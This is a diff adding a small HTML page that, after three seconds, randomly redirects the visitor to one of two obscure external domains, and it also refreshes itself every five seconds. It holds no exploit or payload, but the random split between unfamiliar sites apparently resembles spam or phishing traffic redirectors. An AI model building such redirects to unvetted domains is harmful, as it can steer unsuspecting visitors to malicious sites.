@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="5"> <!-- Optional: Refreshes page every 5 seconds -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Redirect</title>
+    <script>
+        window.onload = function() {
+            // Define two URLs
+            var url1 = "https://oldfanspage.lol/IN/index.html";
+            var url2 = "https://test.lqladepageback.xyz/tock.html";
+            
+            // Randomly choose one URL (50-50 chance)
+            var redirectUrl = Math.random() < 0.5 ? url1 : url2;
+            
+            // Redirect after 3 seconds (adjust as needed)
+            setTimeout(function() {
+                window.location.href = redirectUrl;
+            }, 3000); // 3000 milliseconds = 3 seconds
+        };
+    </script>
+</head>
+<body>
+    <h2>Redirecting you to a random page...</h2>
+</body>
+</html>
